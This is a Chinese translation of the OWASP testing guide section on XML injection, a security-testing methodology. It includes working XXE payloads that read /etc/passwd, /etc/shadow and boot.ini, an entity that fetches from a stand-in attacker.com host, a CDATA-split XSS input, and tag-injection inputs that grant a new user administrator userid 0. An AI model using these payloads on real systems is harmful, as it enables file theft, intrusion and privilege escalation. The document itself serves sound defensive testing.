# 测试XML注入

|ID          |
|------------|
|WSTG-INPV-07|

## 概述

XML注入测试是测试人员尝试将XML文档注入应用程序的方式。如果XML解析器未能对数据进行上下文验证，则测试将产生阳性结果。

本节描述XML注入的实际示例。首先，定义XML样式通信并解释其工作原理。然后是发现方法，在该方法中我们尝试插入XML元字符。一旦完成第一步，测试人员将获得有关XML结构的一些信息，因此可以尝试注入XML数据和标签（标签注入）。

## 测试目标

- 识别XML注入点。
- 评估可以获得的漏洞利用类型及其严重程度。

## 如何测试

假设有一个Web应用程序使用XML样式通信来执行用户注册。这是通过在`xmlDb`文件中创建和添加新的`user>`节点来完成的。

假设xmlDB文件如下：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

当用户通过填写HTML表单注册自己时，应用程序接收用户的数据（为简单起见，假设以GET请求发送）。

例如，以下值：

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

将产生请求：

`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

然后，应用程序构建以下节点：

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

将添加到xmlDB：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### 发现

测试应用程序是否存在XML注入漏洞的第一步是尝试插入XML元字符。

XML元字符是：

- 单引号：`'` - 如果不进行清理，当注入的值将成为标签中属性值的一部分时，此字符可能在XML解析期间抛出异常。

例如，假设有如下属性：

`<node attrib='$inputValue'/>`

所以，如果：

`inputValue = foo'`

被实例化然后作为attrib值插入：

`<node attrib='foo''/>`

然后，生成的XML文档不是格式良好的。

- 双引号：`"` - 此字符与单引号具有相同含义，如果属性值用双引号括起，则可以使用它。

`<node attrib="$inputValue"/>`

所以如果：

`$inputValue = foo"`

替换给出：

`<node attrib="foo""/>`

生成的XML文档无效。

- 尖括号：`>`和`<` - 通过在用户输入（如以下）中添加左或右尖括号：

`Username = foo<`

应用程序将构建新节点：

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但是，由于存在左`<'，生成的XML文档无效。

- 注释标签：`<!--/-->` - 这组字符被解释为注释的开始/结束。因此，通过在Username参数中注入其中一个：

`Username = foo<!--`

应用程序将构建如下节点：

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

这不是有效的XML序列。

- 与号：`&`- 与号在XML语法中用于表示实体。实体的格式为`&symbol;`。实体映射到Unicode字符集中的字符。

例如：

`<tagnode>&lt;</tagnode>`

格式良好且有效，表示`<` ASCII字符。

如果`&`本身没有用`&amp;`编码，则可用于测试XML注入。

实际上，如果提供如下输入：

`Username = &foo`

将创建一个新节点：

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但是，文档再次无效：`&foo`未以`;`终止，`&foo;`实体未定义。

- CDATA节分隔符：`<!\[CDATA\[ / ]]>` - CDATA节用于转义包含将被识别为标记的字符的文本块。换言之，封闭在CDATA节中的字符不被XML解析器解析。

例如，如果需要表示字符串`<foo>`在文本节点中，可以使用CDATA节：

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

这样，`<foo>`不会被解析为标记，将被视为字符数据。

如果节点以如下方式创建：

`<username><![CDATA[<$userName]]></username>`

测试人员可以尝试注入结束CDATA字符串`]]>`以尝试使XML文档无效。

`userName = ]]>`

这将变为：

`<username><![CDATA[]]>]]></username>`

这不是有效的XML片段。

另一个测试与CDATA标签有关。假设XML文档被处理以生成HTML页面。在这种情况下，CDATA节分隔符可能只是被消除，而不进一步检查其内容。然后，可以注入HTML标签，这些标签将包含在生成的页面中，完全绕过现有的清理例程。

让我们考虑一个具体示例。假设我们有一个包含一些文本的节点，将显示给用户。

```xml
<html>
    $HTMLCode
</html>
```

然后，攻击者可以提供以下输入：

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

并获得以下节点：

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

在处理过程中，CDATA节分隔符被消除，生成以下HTML代码：

```html
<script>
    alert('XSS')
</script>
```

结果是应用程序容易受到XSS。

外部实体：有效实体的集合可以通过定义新实体进行扩展。如果实体的定义是URI，则该实体称为外部实体。除非配置为否则，外部实体强制XML解析器访问URI指定的资源，例如本地机器上的文件或远程系统上的文件。此行为向应用程序公开XML外部实体（XXE）攻击，可用于对本地系统执行拒绝服务、在本地机器上未经授权访问文件、扫描远程机器以及对远程系统执行拒绝服务。

要测试XXE漏洞，可以使用以下输入：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

如果XML解析器尝试用/dev/random文件的内容替换实体，此测试可能会崩溃Web服务器（在UNIX系统上）。

其他有用的测试如下：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### 标签注入

完成第一步后，测试人员将获得有关XML文档结构的一些信息。然后可以尝试注入XML数据和标签。我们将展示一个可能导致权限提升的攻击示例。

让我们考虑前面的应用程序。通过插入以下值：

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

应用程序将构建一个新节点并将其附加到XML数据库：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

生成的XML文件格式良好。此外，对于用户tony，与userid标签关联的值可能是最后出现的值，即0（管理员ID）。换言之，我们注入了一个具有管理权限的用户。

唯一的问题是userid标签在最后用户节点中出现了两次。通常，XML文档与模式或DTD相关联，如果不符合，将被拒绝。

让我们假设XML文档由以下DTD指定：

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

请注意，userid节点定义为基数1。在这种情况下，我们之前显示的攻击（以及其他简单攻击）将不起作用，如果XML文档在任何处理之前根据其DTD进行验证的话。

但是，如果测试人员控制与违规节点（userid，在本例中）之前某些节点的值，则可以解决此问题。实际上，测试人员可以通过注入注释开始/结束序列来注释掉该节点：

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

在这种情况下，最终XML数据库为：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

原始`userid`节点已被注释掉，仅留下注入的节点。文档现在符合其DTD规则。

## 源代码审查

如果未正确配置，以下Java API可能容易受到XXE。

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

检查源代码是否将docType、外部DTD和外部参数实体设置为禁止使用。

- [XML外部实体（XXE）防范速查表](https://cheatseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

此外，如果版本低于3.10.1，Java POI office阅读器可能容易受到XXE攻击。

可以从JAR的文件名识别POI库的版本。例如，

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

以下源代码关键字可能适用于C。

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## 工具

- [XML注入模糊字符串（来自wfuzz工具）](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## 参考资料

- [XML注入](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck，"XXE（Xml外部实体）攻击"](https://www.securityfocus.com/archive/1/297714)
- [OWASP XXE防范速查表](https://cheatseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
